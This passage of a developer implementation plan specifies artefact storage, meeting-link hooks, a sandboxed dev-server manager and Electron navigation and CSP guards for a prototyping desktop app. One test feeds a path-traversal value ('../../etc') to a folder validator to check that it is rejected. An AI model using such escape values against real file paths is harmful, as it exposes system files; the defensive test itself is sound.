- Keep the offline mode working: new backend calls get mocks in the existing mock layer.
- Never edit package.json, lockfiles, .env files, *.config.* files or .poltergeist/.
- Change incrementally; do not rewrite screens that work.
- Your final message is ONE line summarising what changed (no preamble, no markdown).
```
- [ ] **Tests:** command for each mode (allowed/disallowed tool strings, `--append-system-prompt` content), bootstrap prompt has no transcript, worktree mode disallows `Edit(package.json)`.

### Task B4: routes

**Files:** `ghostbrain/api/models/design.py`, `ghostbrain/api/routes/design.py`, `ghostbrain/api/tests/test_design_routes.py`.

- [ ] `GET /v1/design/codebases?q=&refresh=` → `[CodebaseCandidate]` via `codebases.search(q)` (empty q → `scan()` frontend first, top 50).
- [ ] `POST /v1/design/session/codebase {path: str|null}` → `_act(lambda s: s.set_codebase(path))`.
- [ ] Snapshot model gains the new fields.
- [ ] Tests: 200 with fake scan; set_codebase 409 after revs; 422 unknown path.

---

## Workstream C — sidecar: artefacts + meeting links

Owns `ghostbrain/design/artefacts.py`, `ghostbrain/recorder/hooks.py`, hook calls in `ghostbrain/recorder/manual.py` and `ghostbrain/recorder/daemon.py`, `ghostbrain/api/routes/design_artefacts.py` (+ include line in `api/main.py`), tests `tests/test_design_artefacts.py`, `tests/test_recorder_hooks.py`, `ghostbrain/api/tests/test_design_artefacts_routes.py`. Consumes A (`worktree.Worktree.from_dict`, `worktree.remove`, `worktree.revisions`) and `scaffold.eject`, `session.pointer_path`.

### Task C1: artefact.json + README

- [ ] **Tests:**
```python
def test_write_creates_json_and_note(vault):
    folder = vault / "20-contexts/personal/prototypes/2026-10-10-login"
    folder.mkdir(parents=True)
    artefacts.write(folder, DATA)       # DATA = schema example, kind prototype, ui_rev 2
    assert artefacts.load(folder)["ui_rev"] == 2
    note = (folder / "README.md").read_text()
    assert note.startswith("---\ntype: artefact\nkind: prototype\n")
    assert "# Login screen review" in note and "rev 2:" in note

def test_note_links_meeting_when_known(vault):
    ... DATA | {"meeting": "Login review", "meeting_path": "20-contexts/personal/calendar/transcripts/x.md"}
    assert 'meeting: "[[20-contexts/personal/calendar/transcripts/x|Login review]]"' in note

def test_worktree_note_lists_repo_branch(vault): ...   # "- Code: `<worktree>` on branch `poltergeist/…` (from <repo>)"
```
- [ ] Frontmatter keys in order: `type, kind, title, date, context, project, design_system, meeting, meeting_path, ui_rev, board_rev, repo, worktree, branch` (omit None). Body: `# <title>`, "Built live during **[[meeting]]** on <date>." (or "during a meeting" when unknown), code line (worktree) / "Prototype: `src/`" (scratch), board line, rev list. Atomic writes (tmp + `os.replace`).

### Task C2: listing, detail, folder guard, remove, eject

- [ ] **Tests:**
```python
def test_list_scans_prototypes_and_artefacts_newest_first(vault): ...  # two folders, different dates
def test_list_reads_legacy_readme_without_json(vault): ...             # README with type: prototype → kind prototype, ui_rev from "rev N" lines
def test_folder_for_rejects_escape(vault):
    with pytest.raises(ValueError): artefacts.folder_for("../../etc")
    with pytest.raises(ValueError): artefacts.folder_for("20-contexts/personal/notes/x")
def test_detail_marks_missing_worktree(vault): ...                      # codebase.worktree path absent → missing True
def test_remove_worktree_missing_is_success(vault, monkeypatch): ...
def test_detail_revs_scratch_from_git_and_worktree_from_branch(vault, monkeypatch): ...
```
- [ ] `id` = folder path relative to vault (posix). `folder_for` accepts only `20-contexts/<ctx>/[projects/<slug>/](prototypes|artefacts)/<name>` with no `..`, and the folder must exist.
- [ ] `detail`: revs = `worktree.revisions(Worktree.from_dict(codebase))` when worktree exists, else `artefact.json` revs; board_model from `board.json`.
- [ ] `eject`: scratch only → `scaffold.eject(folder)`.

### Task C3: recorder hook + meeting link

- [ ] `ghostbrain/recorder/hooks.py`: list of callbacks; `fire_transcribed` calls each in try/except (log).
- [ ] Call `hooks.fire_transcribed(wav, note_path)` in `manual.recover_one` right after `_file_transcript` returns, and in `daemon.py` right after the `transcript_linked` audit log with `result.transcript_note`.
- [ ] `artefacts.link_meeting(wav, note_path)` (registered at import of `ghostbrain.design.artefacts` via `hooks.on_transcribed`; import it from `ghostbrain/api/routes/design_artefacts.py` so the sidecar always registers):
  - pointer = `session.pointer_path(wav)` JSON → `prototype_dir`; missing → return False.
  - data = `load(folder)` (None → return False). Meeting title = frontmatter `title` of the note (via `vault_index.parse.split_frontmatter`) or note stem.
  - set `meeting`, `meeting_path` (vault-relative), and `title` (only if current title is `"Meeting"`/empty/starts with `meeting-`), `write(folder, data)`.
  - meeting note: add `artefacts:` frontmatter list entry `<artefact id>/README` if absent; append (once) section `\n## Artefacts\n\n- [[<id>/README|<title>]] — <kind>, rev <n>\n`; if the section exists but the line doesn't, add the line. Atomic write.
  - If the live session for `wav` is in the registry, update its `recording_title` too.
- [ ] **Tests:**
```python
def test_fire_transcribed_swallows_errors(): ...
def test_link_meeting_updates_both_sides(vault, tmp_path): ...
def test_link_meeting_idempotent(vault, tmp_path): ...       # call twice → one line, one list entry
def test_link_meeting_without_session_is_noop(vault, tmp_path): assert artefacts.link_meeting(tmp_path/"x.wav", note) is False
def test_recover_one_fires_hook(monkeypatch, ...): ...       # patch transcribe/_file_transcript, assert hook called with note path
```

### Task C4: routes

- [ ] `ghostbrain/api/routes/design_artefacts.py`: `GET /v1/design/artefacts` (list), `GET /v1/design/artefact?id=` (detail, 404), `POST /v1/design/artefacts/remove-worktree {id}`, `POST /v1/design/artefacts/eject {id}` (409 for non-scratch). ValueError → 404.
- [ ] Tests for each, including id escape → 404.

---

## Workstream D — desktop main: dev server, IPC, guards

Owns `desktop/src/main/design-devserver.ts` (new), `desktop/src/main/index.ts` (IPC only), `desktop/src/main/navigation-guard.ts`, `desktop/src/renderer/index.html` (CSP), tests `desktop/src/main/__tests__/design-devserver.test.ts`, `navigation-guard.test.ts`.

### Task D1: `design-devserver.ts`

```ts
export interface RunConfig { script: string; port_flag: '--port' | '-p' | null; url_path: string }
export function readRunConfig(appDir: string): RunConfig | null;      // validates shape; script must exist in appDir/package.json scripts
export function devServerArgv(pm: 'npm'|'pnpm'|'yarn', cfg: RunConfig, port: number): string[];
  // npm/pnpm: [pm,'run',script,'--',port_flag,String(port)] (omit '--' part when port_flag null); yarn: ['yarn',script,port_flag,port]
export function packageManager(appDir: string): 'npm'|'pnpm'|'yarn';
export function isAllowedWorktree(worktree: string, appDir: string): boolean;
  // worktree basename contains '-poltergeist-', worktree/.git is a FILE, appDir is inside worktree, appDir/.poltergeist/run.json exists
export class DevServers {
  constructor(opts?: { spawn?: typeof spawn; fetch?: (url: string) => Promise<number>; freePort?: () => Promise<number>; now?: () => number; idleMs?: number; readyMs?: number });
  ensure(worktree: string, appDir: string): Promise<DevServerResult>;  // starts or reuses; refcount++
  release(worktree: string): void;                                    // refcount--, idle timer at 0
  stopAll(): void;                                                    // process-group kill (detached + process.kill(-pid))
}
```
- env: `process.env` + extra PATH (`buildExtraPath` from `sidecar.ts`) + `PORT` + the four offline flags + `BROWSER=none`.
- ready: poll `fetch(http://127.0.0.1:<port><url_path>)` every 500 ms until status < 500, or stdout line matching `/https?:\/\/(?:localhost|127\.0\.0\.1):(\d+)/` (use that port). Timeout → kill, `{ok:false,error:'Dev server did not start within 120s: <last 20 output lines>'}`.
- errors: lines matching `/error|failed to compile|\[vite\] internal server error|module not found/i` collected; `ensure` returns and clears them.
- exit while viewers > 0 → restart once; second exit → next `ensure` returns `{ok:false,error:'Dev server exited: <tail>'}`.
- [ ] **Tests** with a fake spawn (EventEmitter child with `stdout`/`stderr` PassThrough, `pid`, `kill`), fake fetch, fake timers:
  - starts with expected argv/env/cwd (`shell:false`, `detached:true`), ready on fetch 200 → `{ok:true,url:'http://127.0.0.1:5555/'}`;
  - second ensure reuses (spawn once), release ×2 → stopped after idle 60 s, not before;
  - stdout URL with different port wins;
  - never ready → error after 120 s and child killed;
  - error lines surface once;
  - `isAllowedWorktree` rejects a normal repo, a path without `-poltergeist-`, appDir outside worktree;
  - `readRunConfig` rejects a script not in package.json and unknown `port_flag`.

### Task D2: IPC + guards + CSP

- [ ] `index.ts`: `gb:design:devserver:ensure(worktree, appDir)` → validate strings + `isAllowedWorktree` (realpath both) → `devServers.ensure`; `release`; `app.on('will-quit', () => devServers.stopAll())`. Track viewers per `webContents` and release on `destroyed`.
- [ ] `gb:design:open-path(path, how)`: path must be inside the vault (realpath) **or** pass `isAllowedWorktree(path, path)`-style check (worktree root); `finder` → `shell.showItemInFolder`; `editor` → `spawn('code', [path], {detached:true, shell:false})` falling back to `shell.openPath(path)` on spawn error.
- [ ] `navigation-guard.ts` `will-frame-navigate`: frames whose current URL is `http://127.0.0.1:<p>` or `http://localhost:<p>` may navigate only within the same origin (plus `about:blank`).
- [ ] Permission handler: deny all permissions to `requestingUrl` starting with `http://127.0.0.1:` / `http://localhost:` (extend the existing `gbproto:` check).
- [ ] CSP in `renderer/index.html`: `frame-src gbproto: http://127.0.0.1:* http://localhost:*`.
- [ ] Tests: nav guard localhost cases (same-origin allowed, cross-origin blocked, main frame untouched).

---

## Workstream E — renderer: picker, worktree frame, Artefacts tab

Owns `desktop/src/renderer/components/design/{DesignPanel,PrototypeFrame,CodebasePicker}.tsx`, `desktop/src/renderer/screens/artefacts.tsx` (new), `desktop/src/renderer/components/artefacts/*` (new), `stores/navigation.ts` (add `'artefacts'`), `components/Sidebar.tsx` (nav item `{ id: 'artefacts', icon: 'layers', label: 'artefacts' }` after meetings), `App.tsx` (route), `lib/api/hooks.ts` (queries), `stores/design-session.ts` (`codebase` command, new event label handling), tests in `desktop/src/renderer/__tests__/`.

### Task E1: Codebase picker + worktree states in the panel

- [ ] `designSession.codebase(path: string | null)` → `command('codebase', { path })`.
- [ ] `useCodebases(q)` → `GET /v1/design/codebases?q=`.
- [ ] `CodebasePicker`: chip in the panel header: `Scratch` or `<name> · <branch>`; popover with search input + list (name, rel, "frontend" tag) + "Scratch prototype" option; disabled with tooltip once `canvases.ui.rev > 0`.
- [ ] Panel shows `install === 'running'` as "Installing dependencies…", `failed` with the reason and a **Use scratch instead** button (calls `codebase(null)`; allowed because rev is 0).
- [ ] `command` events with `command === 'codebase'` toast the label (with Undo when token present, "Choose repo" action opening the picker when label starts with "Couldn't find").
- [ ] Tests: picker lists + selects (POST body), disabled after rev, install states render, fallback toast action.

### Task E2: `PrototypeFrame` worktree mode

- [ ] When `session.ui_kind === 'worktree' && session.codebase`: on mount/rev change call `window.gb.design.devserver.ensure(codebase.worktree, codebase.app_dir)`; `ok` → load `url + lastHash` into the back slot (append `?gbrev=<rev>` only if url has no query, else `&gbrev=`) and swap on load (same as scratch); `errors.length` → `report(rev, errors.join('\n'))`; `!ok` → `setProblem('build')` + report. Release on unmount. Header label "Starting dev server…" while the first ensure is pending.
- [ ] Iframe sandbox for localhost: `allow-scripts allow-same-origin allow-forms allow-popups` (no top navigation).
- [ ] Pop-out uses the same component (already) — make sure only the panel reports errors (existing `reportErrors`).
- [ ] Tests: ensure called with codebase paths; url swapped on load; error path reports once per rev; release on unmount.

### Task E3: Artefacts screen

- [ ] Hooks: `useArtefacts()` (`GET /v1/design/artefacts`, refetch 15 s), `useArtefact(id)` (`GET /v1/design/artefact?id=`), mutations `removeWorktree(id)`, `ejectArtefact(id)`.
- [ ] `screens/artefacts.tsx`: TopBar "Artefacts"; left list grouped by date (Today / Yesterday / date), filters (context select, kind segmented: All · Prototypes · Worktrees · Boards); row shows title, kind icon (`app-window` prototype, `git-branch` worktree, `workflow` board), meeting title, `repo · branch` for worktrees, `rev N`, "worktree missing" pill when `codebase.missing`.
- [ ] Detail: header (title, meeting link → `useNoteView().open(meeting_path)`), action buttons (Open in editor, Reveal in Finder → `window.gb.design.openPath`; Eject for prototypes; Remove worktree with confirm dialog, shows `branch_kept` message), tabs Preview | Board | Revisions.
  - Preview prototype: `ArtefactPrototype` → `window.gb.design.build(detail.folder, detail.ui_rev)` and an iframe on the url (single buffer is fine here).
  - Preview worktree: `devserver.ensure(...)` with "Starting dev server…" and error state; release on unmount; disabled when missing.
  - Board: reuse `EventStormBoard` + `ArchitectureView` with `board_model`.
  - Revisions: list `revs` newest first.
- [ ] Empty state: "No artefacts yet — start a recording and say "let's kick off a frontend prototype"."
- [ ] Tests: list grouping + filters, detail actions call the right APIs, worktree preview ensure/release, missing worktree disables preview, meeting link opens note.

---

## Final integration (coordinator)

1. `.venv/bin/python -m pytest -q` (compare failures to the known pre-existing set), `cd desktop && npm run typecheck && npx vitest run && npm run lint`.
2. Grep the diff for private client names (see the coordinator's memory) before committing.
3. Live smoke (dev build, `GHOSTBRAIN_CAPTURE_BIN=/Applications/Poltergeist.app/Contents/Resources/bin/ghostbrain-capture npm run dev`):
   - scratch session → end → transcript → artefact README has the meeting link and the meeting note has an Artefacts section; Artefacts tab shows and previews it.
   - worktree session against a tiny local Vite fixture repo under a temp code root (one `fetch('/api/items')`): bootstrap mocks it, dev server preview renders, a nudge produces rev 2, protected-file revert works.
   - real try against `orbit-web` via the codebase picker; report what the bootstrap did, then remove the worktree.
4. Commit per workstream; do not push.
